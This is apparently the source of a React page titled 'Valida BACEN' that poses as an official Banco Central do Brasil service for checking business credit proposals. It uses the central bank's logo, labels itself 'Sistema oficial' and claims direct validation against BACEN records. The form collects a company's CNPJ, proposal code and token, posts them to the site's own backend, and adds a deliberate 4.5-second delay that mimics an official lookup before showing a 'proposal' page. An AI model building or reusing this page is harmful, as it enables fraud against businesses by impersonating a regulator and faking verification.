import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { toast } from "sonner";
import { ShieldCheck, Search, KeyRound, Building2 } from "lucide-react";
import api, { formatCNPJ } from "@/lib/api";

export default function ClientValidation() {
  const navigate = useNavigate();
  const [cnpj, setCnpj] = useState("");
  const [codigo, setCodigo] = useState("");
  const [token, setToken] = useState("");
  const [loading, setLoading] = useState(false);

  const onSubmit = async (e) => {
    e.preventDefault();
    if (!cnpj || !codigo || !token) {
      toast.error("Preencha CNPJ, código e token.");
      return;
    }
    setLoading(true);
    // 4.5s delay as required
    const wait = new Promise((r) => setTimeout(r, 4500));
    try {
      const [{ data }] = await Promise.all([
        api.post("/proposals/validate", {
          cnpj: cnpj.trim(),
          codigo: codigo.trim().toUpperCase(),
          token: token.trim().toUpperCase(),
        }),
        wait,
      ]);
      sessionStorage.setItem("vb_validated", JSON.stringify(data));
      localStorage.setItem("vb_validated", JSON.stringify(data));
      navigate("/proposta");
    } catch (err) {
      await wait; // still respect minimum wait
      const msg =
        err.response?.data?.detail ||
        "Não foi possível validar. Tente novamente.";
      toast.error(msg);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-[#f1f1f1]" data-testid="client-validation-page">
      {/* Header */}
      <header className="bg-[#025c75] text-white">
        <div className="max-w-6xl mx-auto px-6 py-5 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-11 h-11 rounded-md bg-white flex items-center justify-center p-1">
              <img src="/bacen-logo.png" alt="Banco Central do Brasil" className="w-full h-full object-contain" />
            </div>
            <div>
              <div className="text-[11px] uppercase tracking-[0.18em] opacity-80">Sistema oficial</div>
              <div className="text-lg font-bold tracking-tight">Valida BACEN</div>
            </div>
          </div>
        </div>
      </header>

      {/* Hero / Form */}
      <main className="flex-1">
        <div className="max-w-6xl mx-auto px-6 py-10 lg:py-16 grid lg:grid-cols-2 gap-10 items-center">
          {/* Left copy */}
          <div className="anim-fade-up">
            <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-[#025c75]/10 text-[#025c75] text-xs font-semibold uppercase tracking-wider">
              <ShieldCheck className="w-3.5 h-3.5" /> Consulta segura
            </div>
            <h1 className="mt-5 text-4xl lg:text-5xl font-bold tracking-tight text-gray-900 leading-tight">
              Verifique a autenticidade da sua proposta de crédito empresarial.
            </h1>
            <p className="mt-5 text-gray-600 text-base leading-relaxed max-w-lg">
              Informe o CNPJ da empresa, o código e o token recebidos do banco para validar oficialmente
              os dados da operação. A consulta é gratuita e protegida.
            </p>

            <ul className="mt-8 space-y-3 text-sm text-gray-700">
              <li className="flex items-start gap-3">
                <span className="mt-1 w-1.5 h-1.5 rounded-full bg-[#025c75]" />
                Sem cadastro. Sem login. Apenas os três dados oficiais.
              </li>
              <li className="flex items-start gap-3">
                <span className="mt-1 w-1.5 h-1.5 rounded-full bg-[#025c75]" />
                Dados criptografados. Validação direta com a base do BACEN.
              </li>
              <li className="flex items-start gap-3">
                <span className="mt-1 w-1.5 h-1.5 rounded-full bg-[#025c75]" />
                Visualização no formato oficial do documento.
              </li>
            </ul>
          </div>

          {/* Form */}
          <div className="anim-fade-up" style={{ animationDelay: "120ms" }}>
            <div className="bg-white rounded-lg border border-gray-200 shadow-sm p-7 lg:p-8">
              <h2 className="text-xl font-bold text-gray-900 tracking-tight">
                Validar proposta
              </h2>
              <p className="text-sm text-gray-500 mt-1">
                Preencha os três campos para conferir os dados oficiais.
              </p>

              <form onSubmit={onSubmit} className="mt-6 space-y-4">
                <div>
                  <label className="label-base flex items-center gap-1.5">
                    <Building2 className="w-3.5 h-3.5" /> CNPJ da empresa
                  </label>
                  <input
                    data-testid="cnpj-input"
                    className="input-base"
                    placeholder="00.000.000/0000-00"
                    value={cnpj}
                    onChange={(e) => setCnpj(formatCNPJ(e.target.value))}
                    maxLength={18}
                    disabled={loading}
                  />
                </div>

                <div>
                  <label className="label-base flex items-center gap-1.5">
                    <Search className="w-3.5 h-3.5" /> Código da proposta
                  </label>
                  <input
                    data-testid="codigo-input"
                    className="input-base uppercase"
                    placeholder="PROP-2026-0000"
                    value={codigo}
                    onChange={(e) => setCodigo(e.target.value.toUpperCase())}
                    disabled={loading}
                  />
                </div>

                <div>
                  <label className="label-base flex items-center gap-1.5">
                    <KeyRound className="w-3.5 h-3.5" /> Token de validação
                  </label>
                  <input
                    data-testid="token-input"
                    className="input-base uppercase"
                    placeholder="VB-XXXX-XXXX-XXXX"
                    value={token}
                    onChange={(e) => setToken(e.target.value.toUpperCase())}
                    disabled={loading}
                  />
                </div>

                <button
                  type="submit"
                  data-testid="validate-submit-btn"
                  disabled={loading}
                  className="btn-primary w-full !py-3 mt-2"
                >
                  {loading ? (
                    <>
                      <span className="spinner" /> Verificando autenticidade...
                    </>
                  ) : (
                    <>
                      <ShieldCheck className="w-4 h-4" /> Validar proposta
                    </>
                  )}
                </button>
              </form>

              <div className="mt-5 text-[11px] text-gray-400 leading-relaxed">
                A verificação pode levar alguns segundos enquanto consultamos os registros oficiais.
              </div>
            </div>
          </div>
        </div>
      </main>

      <footer className="border-t border-gray-200 bg-white">
        <div className="max-w-6xl mx-auto px-6 py-5 text-xs text-gray-500 flex flex-wrap items-center justify-between gap-3">
          <span>© {new Date().getFullYear()} Valida BACEN — Sistema de validação de propostas de crédito.</span>
          <span>Dúvidas? Procure o seu gerente.</span>
        </div>
      </footer>
    </div>
  );
}
